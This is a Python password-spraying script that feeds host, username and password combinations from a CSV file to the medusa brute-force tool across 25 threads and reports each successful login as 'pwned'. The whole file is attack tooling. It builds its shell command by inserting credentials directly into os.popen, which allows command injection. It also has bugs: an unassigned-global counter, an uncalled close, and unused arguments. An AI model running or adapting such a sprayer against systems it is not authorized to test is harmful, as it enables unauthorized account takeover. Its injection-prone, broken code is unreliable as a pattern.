#!/usr/bin/env python3

import argparse
import concurrent.futures
import threading
import csv
import os

from colorama import Fore
from colorama import Style

parser = argparse.ArgumentParser()
parser.add_argument('-x', help='Nmap file to scan for inputs')
parser.add_argument('-iL', help='Take pre-permutations as input (must be generated with -g)')
parser.add_argument('-H', help='Hosts to spray against.')
parser.add_argument('-U', help='Username file spray (username per newline)')
parser.add_argument('-P', help='Password file spray (username per newline)')
parser.add_argument('--protocols', help='Protocols to spray')
parser.add_argument('--generate', help='Generate permutations')
parser.add_argument('--run', help='Run spray')
parser.add_argument('-random', help='Randomize target list')
args = parser.parse_args()

print(args.H)

thread_local = threading.local()
filename = "cand2"
outfile = open("output", "w")
threads = 25
pwned = 0

def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

def test_account(row):
    ip = row[0]
    username = row[1]
    password = row[2]
    service = row[3]
    port = row[4]

    output = os.popen(f'medusa -b -h {ip} -u "{username}" -p "{password}" -M "{service}" -n "{port}" 2>&1').read()
    outfile.write(output)

    print(f"[{Fore.GREEN}INF{Style.RESET_ALL}] {Fore.BLUE}Trying: {service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}")
    if "[SUCCESS]" in output:
        print(f'{Fore.GREEN}AUTHENTICATION SUCCESSFUL! {Fore.YELLOW}{service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}{output}{Style.RESET_ALL}')
        pwned += 1
    else:   
        print(f'{Fore.BLUE}{output}{Style.RESET_ALL}')

with open(filename, newline="") as csvfile:
    reader = csv.reader(csvfile, delimiter=',', quotechar='"') 
    total_hosts = file_len(filename)

    print(f'{Fore.BLUE}Starting password spray against {total_hosts} total hosts using {threads} threads...{Style.RESET_ALL}')

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(test_account, reader)

    outfile.close
    print(f'{Fore.GREEN}Spray complete against {total_hosts} total hosts!{Style.RESET_ALL}')
    print(f'{Fore.RED}Discovered {pwned} user accounts!{Style.RESET_ALL}')
